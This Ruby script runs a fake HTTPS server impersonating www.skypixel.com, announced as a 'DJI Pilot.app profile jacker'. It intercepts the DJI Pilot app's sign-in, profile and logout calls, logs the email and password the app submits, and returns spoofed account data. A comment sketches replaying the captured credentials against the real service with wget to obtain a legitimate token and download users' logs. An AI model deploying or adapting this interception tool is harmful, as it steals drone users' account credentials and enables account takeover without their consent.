require 'webrick'
require 'webrick/https'

cert_name = [
	%w[CN www.skypixel.com],
]
include WEBrick

s = HTTPServer.new( :Port => 443, Logger: WEBrick::Log.new("/dev/null"), 
:SSLEnable => true , 
:SSLCertName => cert_name
)
#s = HTTPServer.new( :Port => 80, Logger: WEBrick::Log.new("/dev/null") )

puts "DJI Pilot.app profile jacker has launched"

SIGN_IN_LOVE = '{"status":0,"status_msg":"ok","token":"thisisabullshittoken","avatar":"http://rs1img.memecdn.com/dat-troll-meme-i-made-with-my-extreme-paint-skills_o_721540.jpg"}'

class SIGN_IN < HTTPServlet::AbstractServlet
 def do_POST(req, res)
   res.body = SIGN_IN_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a sign_in request with these credentials: #{req.body}"
# email=xxxxx&password=xxxxxx
#   username = 
#   password = 
# Test the password here, obtain *legit* token and download *real* logs?
#  wget --post-data "email=realuser%40gmail.com&password=realpass" https://www.skypixel.com/api/sign_in
 end
end

PROFILE_MY_LOVE = '{"status":0,"status_msg":"ok",' +
'"id":14963,"email":"realuser@gmail.com","show_name":"Troll Bagginz",' +
'"first_name":"Troll","last_name":"Bagginz","webpage":null,"country":"Deez Nuts",' +
'"country_code":"US","state":"Confusion ","city":"Trollville ","created_at":"1999-01-10T23:13:37.000Z",' +
'"bio":null,"about":null,"likes_count":0,"favorites_count":0,"photos_count":0,"videos_count":0,"gender":"male","account_type":null,' +
'"facebook_url":null,"pinterest_url":null,"tumblr_url":null,"twitter_url":null,' +
'"avatar":"http://rs1img.memecdn.com/dat-troll-meme-i-made-with-my-extreme-paint-skills_o_721540.jpg","active_info":[{"sn":"0123456789","deviceType":"1","productType":"inspire1",' +
'"email":"realuser@gmail.com","appVersion":"0.9.1","deviceName":"Monkey Dicks","activeday":"2015-01-30","ip":"1.2.3.4",' +
'"firmwareVersion":"01.13"}]}'

class PROFILES_MY < HTTPServlet::AbstractServlet
 def do_GET(req, res)
   res.body = PROFILE_MY_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a profile view request for Profile Token: #{req.query_string}"
 end
end

#LOGOUT_JSON_LOVE = '{"status":315,"status_msg":"no member login!"}'
LOGOUT_JSON_LOVE = '{"status":0,"status_msg":"ok"}'

class LOGOUT_JSON < HTTPServlet::AbstractServlet
 def do_GET(req, res)
   res.body = LOGOUT_JSON_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a logout request for Profile Token: #{req.query_string}"
 end
end

trap("INT"){ s.shutdown }
s.mount("/api/sign_in", SIGN_IN)
s.mount("/api/profiles/my", PROFILES_MY)
s.mount("/api/logout.json", LOGOUT_JSON)

s.start

